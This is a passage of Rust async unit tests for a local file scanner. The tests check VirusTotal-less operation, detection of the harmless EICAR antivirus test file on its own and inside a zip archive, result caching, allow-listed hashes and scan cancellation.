        assert_eq!(outcome.files_checked, 1);
        assert!(outcome.findings.is_empty(), "no key means no verdict, not a false alarm");
        assert!(outcome.notes.iter().any(|n| n.contains("No VirusTotal API key")));
        assert!(outcome.notes.iter().any(|n| n.contains("own rules")));

        // The hash is in the cache, so the next scan will not read the file.
        let conn = db.lock().unwrap();
        assert_eq!(crate::db::cached_file_count(&conn), 1);
    }

    #[tokio::test]
    async fn without_a_network_or_a_key_eicar_is_found_on_its_own_and_inside_an_archive() {
        let dir = tempfile::tempdir().unwrap();
        let eicar = crate::rules::samples::eicar();
        std::fs::write(dir.path().join("eicar.com"), &eicar).unwrap();

        let mut zipped = std::io::Cursor::new(Vec::new());
        {
            let mut writer = zip::ZipWriter::new(&mut zipped);
            writer.start_file("inner/eicar.com", zip::write::SimpleFileOptions::default()).unwrap();
            writer.write_all(&eicar).unwrap();
            writer.finish().unwrap();
        }
        std::fs::write(dir.path().join("parcel.zip"), zipped.into_inner()).unwrap();

        let db = Mutex::new(crate::db::open_memory());
        let config = Config { virustotal_api_key: None, ..Default::default() };
        let limiter = RateLimiter::new();
        let cancel = AtomicBool::new(false);
        let paths = [dir.path().to_string_lossy().into_owned()];
        let scan = || run_scan(&db, &config, &limiter, &cancel, &paths, &|_| {});

        let outcome = scan().await;
        assert_eq!(outcome.findings.len(), 2);
        assert!(outcome.findings.iter().all(|f| f.issue.kind == IssueKind::RuleMatch));
        let archive = outcome.findings.iter().find(|f| f.issue.location.ends_with("parcel.zip")).unwrap();
        assert!(archive.issue.title.contains("inside the archive"));
        assert!(archive.issue.detail.as_ref().unwrap().contains("inner/eicar.com"));

        // The second scan reads the answer from the cache and gives the same one.
        let again = scan().await;
        assert_eq!(again.findings.len(), 2);
    }

    #[tokio::test]
    async fn a_trusted_hash_is_skipped_even_though_it_is_still_counted() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("mine.sh");
        std::fs::write(&path, b"#!/bin/sh\n").unwrap();
        let hash = hash_file(&path).unwrap();

        let db = Mutex::new(crate::db::open_memory());
        {
            let conn = db.lock().unwrap();
            crate::db::allow_hash(&conn, &hash, Some("my own script")).unwrap();
        }

        let outcome = run_scan(
            &db,
            &Config::default(),
            &RateLimiter::new(),
            &AtomicBool::new(false),
            &[dir.path().to_string_lossy().into_owned()],
            &|_| {},
        )
        .await;

        assert_eq!(outcome.files_checked, 1);
        assert!(outcome.findings.is_empty());
    }

    #[tokio::test]
    async fn a_cancelled_scan_stops_and_says_so() {
        let dir = tempfile::tempdir().unwrap();
        for i in 0..5 {
            std::fs::write(dir.path().join(format!("f{i}.sh")), b"#!/bin/sh\n").unwrap();
        }

        let cancel = AtomicBool::new(true);
        let outcome = run_scan(
            &Mutex::new(crate::db::open_memory()),
            &Config::default(),
            &RateLimiter::new(),
            &cancel,
            &[dir.path().to_string_lossy().into_owned()],
            &|_| {},
        )
        .await;

        assert_eq!(outcome.files_checked, 0);
        assert!(outcome.notes.iter().any(|n| n.contains("stopped")));
    }
}
